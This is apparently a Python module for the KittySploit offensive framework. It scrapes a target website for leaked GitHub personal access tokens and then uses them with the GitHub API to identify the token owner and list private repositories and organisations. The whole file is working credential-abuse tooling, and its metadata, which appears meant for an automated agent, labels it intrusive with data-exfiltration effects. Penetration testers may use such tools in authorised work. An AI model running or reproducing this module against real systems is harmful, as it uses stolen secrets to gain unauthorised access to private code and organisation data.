#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Enumerate GitHub repos and orgs using leaked personal access tokens."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.github_pat_probe import enumerate_github_pat
from lib.scanner.http.vibe_secrets_probe import collect_vibe_http_bodies, mask_secret


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "GitHub PAT Repository Enumeration",
        "description": (
            "Uses leaked GitHub tokens (ghp_*, github_pat_*) to identify the token owner, "
            "list accessible repositories (including private), and enumerate organizations."
        ),
        "author": ["KittySploit Team"],
        "tags": ["github", "git", "pat", "repository", "enumeration", "auxiliary", "cicd"],
        "modules": [
            "scanner/http/vibe_stack_secrets_detect",
            "scanner/http/github_workflows_secrets_detect",
            "scanner/http/gitlab_ci_secrets_detect",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "data_exfiltration"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.3,
        },
    }

    github_token = OptString("", "GitHub personal access token (ghp_… / github_pat_…)", False)
    auto_discover = OptBool(True, "Scrape target for GitHub tokens", False)

    def run(self):
        bodies = collect_vibe_http_bodies(self.http_request) if self._to_bool(self.auto_discover) else []
        homepage = next((t for p, t in bodies if p == "/"), "")
        for _path, text in bodies:
            if any(m in text for m in ("ghp_", "github_pat_", "GITHUB_TOKEN")):
                homepage = homepage + "\n" + text

        self._configure_session()
        findings, creds = enumerate_github_pat(
            self.session,
            homepage,
            verify_ssl=self._to_bool(self.verify_ssl),
            token=str(self.github_token or "").strip(),
        )

        ok = [f for f in findings if f.get("ok")]
        if not ok:
            print_error("No GitHub API access (set token or enable auto_discover)")
            return False

        for hit in ok:
            if hit.get("kind") == "github_user":
                print_success(f"GitHub user: {hit.get('login')} ({hit.get('email') or 'no email'})")
            elif hit.get("kind") == "github_repos":
                print_success(
                    f"GitHub repos: {hit.get('count', 0)} — "
                    f"{hit.get('private_in_page', 0)} private in sample"
                )
                for repo in hit.get("repos") or []:
                    print_info(f"  → {repo}")
            elif hit.get("kind") == "github_orgs":
                print_success(f"GitHub orgs: {hit.get('organizations', [])}")

        private = any(
            f.get("kind") == "github_repos" and f.get("private_in_page", 0) > 0 for f in ok
        )
        self.set_info(
            severity="critical" if private else "high",
            reason=f"GitHub PAT enum: {len(ok)} API hit(s)",
            findings=findings,
            credentials={k: mask_secret(v) for k, v in creds.items()},
        )
        return True
